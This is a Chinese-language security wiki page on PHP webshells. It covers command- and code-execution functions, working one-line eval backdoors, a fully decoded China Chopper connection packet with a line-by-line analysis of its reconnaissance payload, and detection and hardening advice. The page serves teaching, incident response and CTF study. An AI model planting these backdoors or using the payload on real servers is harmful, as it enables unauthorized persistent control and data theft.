---
title: PHP Webshell 基础：命令执行函数与中国菜刀连接流程深度解析
description: 系统梳理 PHP Webshell 的核心命令执行函数（system、exec、shell_exec、passthru、反引号）与代码执行函数（eval、assert），并对中国菜刀（China
  Chopper）客户端连接时的数据包进行完整解码与逐行代码分析，还原其探测、获取目录、用户、系统信息的全流程。
category: ai-security
tags:
- PHP
- Webshell
- 命令执行
- 代码执行
- 中国菜刀
- China Chopper
- 渗透测试
- 后门分析
- Base64 解码
- 流量分析
date: '2021-11-25'
updated: '2026-11-14'
---
## 概述

Webshell 是以 PHP、ASP、JSP、CGI 等网页文件形式存在的代码执行环境，攻击者上传后可通过 HTTP 请求与服务器交互，执行任意命令或代码，实现对服务器的持久化控制。本页面以 PHP 为例，系统整理：

1.  **命令执行函数** — 直接调用系统 Shell 的五大函数及其差异
2.  **代码执行函数** — `eval()` 与 `assert()` 的机制对比及一句话后门构造
3.  **中国菜刀连接流程** — 实抓数据包 → URL 解码 → Base64 解码 → 逐行还原服务端执行逻辑

> 适用场景：渗透测试复现、应急响应溯源、CTF Web 题目分析、安全教学演示。

---

## 一、命令执行函数对比

| 函数 | 返回值特性 | 是否自动输出 | 典型用途 | 备注 |
|------|------------|--------------|----------|------|
| `system()` | 最后一行输出 | **是** | 快速验证命令回显 | 适合简单测试 |
| `exec()` | 最后一行（可选第二参数数组接收所有行） | 否 | 需要捕获完整输出时 | 配合 `$output` 数组使用 |
| `shell_exec()` | 完整输出字符串 | 否（需 `echo`） | 获取完整文本结果 | 反引号 `` `cmd` `` 的别名 |
| `passthru()` | 无（直接原始输出） | **是**（二进制安全） | 图片/二进制流、需原始格式 | 适合 `Content-Type: image/*` 场景 |
| 反引号 `` `cmd` `` | 完整输出字符串 | 否（需 `echo`） | 简写形式 | 语法糖，等价于 `shell_exec()` |

### `system()` 示例
```php
<?php system("whoami"); ?>
```
访问 `http://target/trojan/system.php` 直接回显命令结果。

### `exec()` 示例
```php
<?php exec("dir", $a); print_r($a); ?>
```
第二参数 `$a` 接收每行输出数组。

### `shell_exec()` 示例
```php
<?php echo shell_exec("dir"); ?>
```
返回完整字符串，需手动输出。

### `passthru()` 示例
```php
<?php passthru("dir"); ?>
```
原始格式输出，适合二进制数据。

### 反引号示例
```php
<?php echo `whoami`; ?>
```
最简写法，内部调用 `shell_exec()`。

---

## 二、代码执行函数与一句话后门

### `eval()` 与 `assert()` 机制差异

| 特性 | `eval()` | `assert()` |
|------|----------|------------|
| 语法 | `eval(string $code)` | `assert(mixed $assertion)` |
| 执行内容 | 任意 PHP 代码字符串 | 断言表达式（PHP 7.2+ 不再支持字符串代码执行） |
| 错误抑制 | 需 `@eval()` | `@assert()` 同样可抑制 |
| 常见后门形态 | `eval($_POST['x']);` | `assert($_POST['x']);`（旧版本） |

> **注意**：PHP 7.2 起 `assert()` 不再接受字符串代码，仅评估布尔表达式；实战中 `eval()` 兼容性更强。

### 一句话后门演进

```php
<!-- 最简 eval 后门 -->
<?php eval($_GET['shell']); ?>
<!-- 请求示例 -->
http://target/assert.php?shell=system('ls');
```

```php
<!-- 生产环境常见变种：POST + 密码参数 + 错误抑制 -->
<?php @eval($_POST['shell']); ?>
```

---

## 三、中国菜刀连接流程深度解析

### 实验环境
- **服务端后门**：`<?php @eval($_POST['shell'])?>`
- **客户端**：中国菜刀（China Chopper）v4.0
- **抓包工具**：Burp Suite / Wireshark

### 原始数据包（URL 编码）
```http
POST /shell.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

shell=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D
```

### 两次解码还原

#### Step 1：URL Decode
```text
shell=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==
```

#### Step 2：Base64 Decode (`z0` 参数)
```php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$D=dirname($_SERVER["SCRIPT_FILENAME"]);
if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);
$R="{$D}\t";
if(substr($D,0,1)!="/"){
    foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";
}
$R.="\t";
$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';
$usr=($u)?$u['name']:@get_current_user();
$R.=php_uname();
$R.="({$usr})";
print $R;
echo("|<-");
die();
```

### 逐行代码逻辑分析

| 代码片段 | 功能说明 | 关键函数/变量 |
|----------|----------|---------------|
| `@ini_set("display_errors","0");` | 关闭错误回显，隐藏异常信息 | `ini_set` |
| `@set_time_limit(0);` | 移除脚本执行时间限制 | `set_time_limit` |
| `@set_magic_quotes_runtime(0);` | 关闭魔术引号（PHP ≤5.3） | `set_magic_quotes_runtime` |
| `echo("->|");` | 输出连接成功标记，客户端据此判断在线 | 固定字符串 `->|` |
| `$D=dirname($_SERVER["SCRIPT_FILENAME"]);` | 获取当前脚本所在目录绝对路径 | `$_SERVER['SCRIPT_FILENAME']` |
| `if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);` | 兼容性兜底，部分环境需用 `PATH_TRANSLATED` | `$_SERVER['PATH_TRANSLATED']` |
| `$R="{$D}\t";` | 初始化返回字符串，首段为目录路径 | `$R` 累积返回数据 |
| `if(substr($D,0,1)!="/"){ foreach(range("A","Z")... }` | **Windows 环境**：枚举 A-Z 盘符，追加存在的盘符到 `$R` | `is_dir` 判断盘符存在性 |
| `$u = function_exists('posix_getegid') ? @posix_getpwuid(@posix_geteuid()) : '';` | **Linux/Unix**：尝试获取当前有效用户信息（UID→用户名） | `posix_geteuid`, `posix_getpwuid` |
| `$usr = ($u) ? $u['name'] : @get_current_user();` | 兜底获取脚本所有者用户名 | `get_current_user()` |
| `$R .= php_uname();` | 追加操作系统内核信息（类型、版本、架构） | `php_uname()` |
| `$R .= "({$usr})";` | 追加用户上下文 | 拼接用户名 |
| `print $R; echo("|<-"); die();` | 输出完整信息块，结束标记 `|<-`，终止脚本 | 客户端解析 `->|...|<-` 之间内容 |

### 客户端解析字段映射

菜刀将 `->|` 与 `|<-` 之间的文本按 `\t` 分割，映射为界面字段：

| 索引 | 字段 | 来源 |
|------|------|------|
| 0 | 当前工作目录 | `$D` |
| 1 | Windows 盘符列表 / Linux 为空 | 盘符枚举结果 |
| 2 | 系统内核信息 | `php_uname()` |
| 3 | 当前用户上下文 | `({$usr})` |

---

## 四、防御与检测建议

1. **文件监控**：定期扫描 Web 目录下含 `eval/assert/system/exec/shell_exec/passthru` 等高危函数的 PHP 文件。
2. **流量特征**：
   - POST 参数名固定为 `shell` / `z0`（菜刀默认）
   - `z0` 值为长 Base64 字符串，解码后含 `ini_set("display_errors","0")` 等特征代码
   - 响应体包含 `->|` 与 `|<-` 标记
3. **PHP 配置加固**：
   ```ini
   disable_functions = eval,assert,system,exec,shell_exec,passthru,proc_open,popen,pcntl_exec
   open_basedir = /var/www/html:/tmp
   display_errors = Off
   ```
4. **WAF/IDS 规则**：对 `base64_decode($_POST[`、`@eval(base64_decode` 等模式进行拦截。

---

## 五、关联知识页面

- [[0w1club-week10-web-injection-training]] — Web 注入基础与绕过技巧，包含 PHP 危险函数禁用策略
- [[cmseasy-7.3.8-code-audit]] — PHP CMS 代码审计实战，涉及任意文件操作与 RCE 链
- [[zzzphp-sql-injection-analysis]] — zzzphp CMS SQL 注入漏洞分析，同属 PHP Web 安全体系
- [[diwuzhijian-2020-web-writeup]] — 第五空间大赛 Web 题解，含 PHP `assert()` RCE 绕过、反序列化 POP 链
- [[mtctf-2021-web-writeup]] — MTCTF 2021 Web 方向，覆盖 PHP 反序列化条件竞争、Session Upload Progress 利用
- [[tctf-2021-1linephp-zip-include]] — TCTF 2021 `1linephp` 题目，利用 `zip://` 协议包含临时文件实现 RCE
- [[spring-boot-devtools-deserialization-rce]] — Java 反序列化 RCE 利用链，对比理解不同语言的代码执行本质
- [[java-deserialization-fundamentals]] — Java 序列化/反序列化核心机制，奠定跨语言对比基础

---

## 六、小结

本页面从 **函数原理 → 后门构造 → 工具流量还原 → 代码逐行解析 → 防御对策** 形成完整知识闭环。掌握上述内容可帮助安全从业者：

- 快速识别 Webshell 变种与连接工具指纹
- 在应急响应中通过流量回溯还原攻击者操作
- 编写针对性的检测规则与加固基线
- 在 CTF/实战中构造/绕过 PHP 代码执行限制

> **持续更新**：随 PHP 版本演进（如 8.0+ 移除 `assert` 字符串执行、`create_function` 废弃）及新型管理工具（AntSword、Godzilla、Behinder 等）出现，建议定期补充新版本特性与流量特征。

## 来源

- [0x00实验室-202108-202304_042](../sources/0x00实验室-202108-202304_042.md)
